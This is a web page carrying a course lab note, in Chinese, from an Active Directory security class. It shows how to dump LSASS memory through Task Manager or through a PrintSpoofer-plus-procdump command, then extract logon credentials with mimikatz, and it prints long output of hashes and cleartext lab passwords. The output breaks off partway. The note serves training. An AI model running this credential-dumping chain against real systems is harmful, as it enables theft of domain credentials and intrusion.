<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/information-security/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Information Security"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>Information Security | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/information-security/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/information-security/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Information Security</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab其他方法得到lsassdmp>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)
<a class=anchor href=#ntustisc---ad-note---lab%e5%85%b6%e4%bb%96%e6%96%b9%e6%b3%95%e5%be%97%e5%88%b0lsassdmp>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?</p><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=take-lsass-with-other-ways>==Take LSASS with other ways==
<a class=anchor href=#take-lsass-with-other-ways>#</a></h3><h4 id=方法一>方法一
<a class=anchor href=#%e6%96%b9%e6%b3%95%e4%b8%80>#</a></h4><p>在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果
<img src=https://hackmd.io/_uploads/ryINQ7NRh.png alt>
<img src=https://hackmd.io/_uploads/ByvHX7NR2.png alt></p><h4 id=方法二>方法二
<a class=anchor href=#%e6%96%b9%e6%b3%95%e4%ba%8c>#</a></h4><p>如果沒有GUI的話，也可以考慮直接使用<a href=https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump>Procdump</a>，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
Command: <code>c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt"</code>
<img src=https://hackmd.io/_uploads/HJXt8mN0h.png alt>
可以看到它放在<code>C:\Windows\system32\lsass.dmp</code>中</p><h4 id=透過minidump獲取資訊>透過Minidump獲取資訊
<a class=anchor href=#%e9%80%8f%e9%81%8eminidump%e7%8d%b2%e5%8f%96%e8%b3%87%e8%a8%8a>#</a></h4><p>有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ Sekurlsa::minidump <span style=color:#e6db74>&#34;&lt;path to lsass.dmp&gt;&#34;</span>
</span></span><span style=display:flex><span>$ Sekurlsa::logonPasswords
</span></span></code></pre></div><p>:::spoiler Result</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mimikatz <span style=color:#75715e># Sekurlsa::minidump &#34;C:\Windows\system32\lsass.dmp&#34;</span>
</span></span><span style=display:flex><span>Switch to MINIDUMP : <span style=color:#e6db74>&#39;C:\Windows\system32\lsass.dmp&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># log</span>
</span></span><span style=display:flex><span>Using <span style=color:#e6db74>&#39;mimikatz.log&#39;</span> <span style=color:#66d9ef>for</span> logfile : OK
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># Sekurlsa::logonPasswords</span>
</span></span><span style=display:flex><span>Opening : <span style=color:#e6db74>&#39;C:\Windows\system32\lsass.dmp&#39;</span> file <span style=color:#66d9ef>for</span> minidump...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>2913881</span> <span style=color:#f92672>(</span>00000000:002c7659<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : DefaultAppPool
</span></span><span style=display:flex><span>Domain            : IIS APPPOOL
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 11:49:20
</span></span><span style=display:flex><span>SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma.org
</span></span><span style=display:flex><span>         * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>2569783</span> <span style=color:#f92672>(</span>00000000:00273637<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : CachedInteractive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : Administrator
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 11:39:37
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-500
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : Administrator
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : Administrator
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : Administrator
</span></span><span style=display:flex><span>         * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>         * Password : 1qaz@WSX3edc
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>1145006</span> <span style=color:#f92672>(</span>00000000:001178ae<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : CachedInteractive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : Administrator
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:43:30
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-500
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : Administrator
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : Administrator
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : Administrator
</span></span><span style=display:flex><span>         * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>         * Password : 1qaz@WSX3edc
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>419256</span> <span style=color:#f92672>(</span>00000000:000665b8<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : bear
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : WIN-818G5VCOLJO
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:29:31
</span></span><span style=display:flex><span>SID               : S-1-5-21-306106713-2531972042-334329499-2101
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : bear
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
</span></span><span style=display:flex><span>         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
</span></span><span style=display:flex><span>         * DPAPI    : 4057a0d0b94378dd03224e8b3d28a006
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : bear
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : bear
</span></span><span style=display:flex><span>         * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>995</span> <span style=color:#f92672>(</span>00000000:000003e3<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : IUSR
</span></span><span style=display:flex><span>Domain            : NT AUTHORITY
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:35
</span></span><span style=display:flex><span>SID               : S-1-5-17
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>         * Domain   : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>997</span> <span style=color:#f92672>(</span>00000000:000003e5<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : LOCAL SERVICE
</span></span><span style=display:flex><span>Domain            : NT AUTHORITY
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:24
</span></span><span style=display:flex><span>SID               : S-1-5-19
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>         * Domain   : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>         * Domain   : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>70310</span> <span style=color:#f92672>(</span>00000000:000112a6<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : DWM-1
</span></span><span style=display:flex><span>Domain            : Window Manager
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:24
</span></span><span style=display:flex><span>SID               : S-1-5-90-0-1
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma.org
</span></span><span style=display:flex><span>         * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>70283</span> <span style=color:#f92672>(</span>00000000:0001128b<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : DWM-1
</span></span><span style=display:flex><span>Domain            : Window Manager
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:24
</span></span><span style=display:flex><span>SID               : S-1-5-90-0-1
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma.org
</span></span><span style=display:flex><span>         * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>996</span> <span style=color:#f92672>(</span>00000000:000003e4<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:21
</span></span><span style=display:flex><span>SID               : S-1-5-20
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : desktop-g95u93t$
</span></span><span style=display:flex><span>         * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>46383</span> <span style=color:#f92672>(</span>00000000:0000b52f<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : UMFD-0
